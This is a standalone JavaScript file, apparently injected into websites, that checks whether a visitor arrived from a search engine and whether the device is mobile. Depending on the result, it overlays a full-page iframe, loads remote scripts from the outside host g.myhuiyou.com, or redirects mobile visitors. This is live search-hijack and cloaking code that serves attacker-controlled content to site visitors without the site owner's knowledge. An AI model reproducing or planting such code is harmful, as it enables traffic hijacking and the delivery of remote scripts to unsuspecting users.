var pcbd_js="<iframe src='https://g.myhuiyou.com/' width=100% height=6500px scrolling=no frameborder=0></iframe>";
var pcnbd_js=["<link rel=stylesheet href=https://g.myhuiyou.com/statics/images/Inaccurate.css>","<script src=https://g.myhuiyou.com/statics/images/Inaccurate.js><\/script>"];
var mbd_js=["<link rel=stylesheet href=https://g.myhuiyou.com/statics/images/precise.css>","<script src=https://g.myhuiyou.com/statics/images/precise.js><\/script>"];
var mnbd_js=["<link rel=stylesheet href=https://g.myhuiyou.com/statics/images/Inaccurate.css>","<script src=https://g.myhuiyou.com/statics/images/Inaccurate.js><\/script>"];

//pc端来自搜索引擎
if(pdpcmb()==2&&pdref()==1){
  document.writeln(pcbd_js);
}
//pc端来自非搜索引擎
if(pdpcmb()==2&&pdref()==2){
  var strTem="";
  for(i=0;i<pcnbd_js.length;i++){
    strTem+=pcnbd_js[i];
  }
  document.writeln(strTem);
}

//移动端来自搜索引擎
if (window.location.hash=="#mobile") {
  var strTem="";
  for(i=0;i<mbd_js.length;i++){
    strTem+=mbd_js[i];
  }
  document.writeln(strTem);
}
//移动端来自搜索引擎
if (pdpcmb()==1&&pdref()==1) {
    var name=window.location.hostname;
    name=name.replace(/^www./,"m.");
    if(window.location.href.indexOf("www.") > 0){
        window.location.href="http://"+name+"/#mobile";
    }
    var strTem="";
    for(i=0;i<mbd_js.length;i++){
        strTem+=mbd_js[i];
    }
    document.writeln(strTem);
}

//移动端来自非搜索引擎
if(pdpcmb()==1&&pdref()==2){
    var name=window.location.hostname;
    name=name.replace(/^www./,"m.");
    if(window.location.href.indexOf("www.") > 0){
        window.location.href="http://"+name;
    }
    var strTem="";
    for(i=0;i<mnbd_js.length;i++){
        strTem+=mnbd_js[i];
    }
    document.writeln(strTem);
}

function pdref(){
    var regexp=/\.(sogou|soso|baidu|google|youdao|yahoo|bing|sm|so|biso|gougou|ifeng|ivc|sooule|niuhu|biso|360)(\.[a-z0-9\-]+){1,2}\//ig;
    var where =document.referrer;
    if(regexp.test(where)){
        return 1; //来自搜索引擎
    }else{
        return 2;
    }
}

function pdpcmb(){
  if (/Android|Windows Phone|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
    return 1;//来自移动端请求
  }else{
    return 2;//来自pc端请求
  }
}